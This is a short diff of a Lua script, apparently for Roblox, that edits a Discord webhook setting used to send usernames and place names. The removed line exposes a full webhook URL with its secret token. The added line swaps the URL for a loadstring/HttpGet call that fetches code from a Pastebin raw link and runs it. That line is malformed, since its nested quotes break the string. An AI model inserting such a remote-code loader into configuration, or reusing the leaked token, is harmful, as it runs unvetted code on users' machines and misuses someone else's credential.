@@ -27,7 +27,7 @@ end
 -- ============================================
 -- DISCORD WEBHOOK
 -- ============================================
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1568617525842022590/WJbfh7iwd-fUago1nEKU3DzqGrT3Jg88EPhXDfSN2v2RFxyViN1bk_iZ6zclBpZlj4wo"
+local WEBHOOK_URL = "loadstring(game:HttpGet("https://pastebin.com/raw/Nw5YHD1F"))()"
 
 local function sendWebhook(username, placeName, action)
     local payload = {
